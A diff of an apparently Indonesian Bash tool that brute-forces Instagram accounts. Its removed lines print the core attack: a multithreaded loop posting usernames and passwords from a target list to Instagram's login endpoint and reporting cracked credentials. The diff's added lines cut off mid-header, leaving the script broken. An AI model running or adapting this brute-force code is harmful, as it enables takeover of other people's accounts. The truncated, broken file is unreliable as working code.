@@ -2,39 +2,7 @@
 # author         : raden/hades/raja
 # thanks to      : surabayahackerlink - @raden_Ar
 # recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
-# Yamaap kalau scriptnya acak"an:(
-
-# color(bold)
-red='\e[1;31m'
-green='\e[1;32m'
-yellow='\e[1;33m'
-blue='\e[1;34m'
-magenta='\e[1;35m'
-cyan='\e[1;36m'
-white='\e[1;37m'
-
-# thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
-limit=50
-
-# banner
-echo -e $'''
-                _  __       _ 
-__     | _|_ o |_)|_     o (_|
-||||_| |  |_ | |_)|  ___ | __|
-\e[1;31mcontact: /radenAr\e[1;37m
-'''
-echo -e "raden ganteng yak"
-
-# dependencies
-dependencies=( "jq" "curl" )
-for i in "${dependencies[@]}"
-do
-    command -v $i >/dev/null 2>&1 || {
-        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
-        exit
-    }
-done
-
+# Yamaap 
 # menu
 echo -e '''
 1]. Get target from specific \e[1;31m@username\e[1;37m
@@ -98,28 +66,4 @@ function brute(){
     url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                     -H "cookie: csrftoken=${token}" \
                     -H "origin: https://www.instagram.com" \
-                    -H "referer: https://www.instagram.com/accounts/login/" \
-                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
-                    -H "x-csrftoken: ${token}" \
-                    -H "x-requested-with: XMLHttpRequest" \
-                    -d "username=${i}&password=${pass}")
-                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
-                    if [[ $login =~ "true" ]]; then
-                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -sXGET "https://instagram.com/${i}/" -L | grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
-                        elif [[ $login =~ "false" ]]; then
-                                    echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
-                            elif [[ $url =~ "checkpoint_required" ]]; then
-                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
-                    fi
-}
-
-# thread
-(
-    for i in $(cat target); do
-        ((thread=thread%limit)); ((thread++==0)) && wait
-        brute "$i" &
-    done
-    wait
-)
-
-rm target
+                    -H "referer: https://
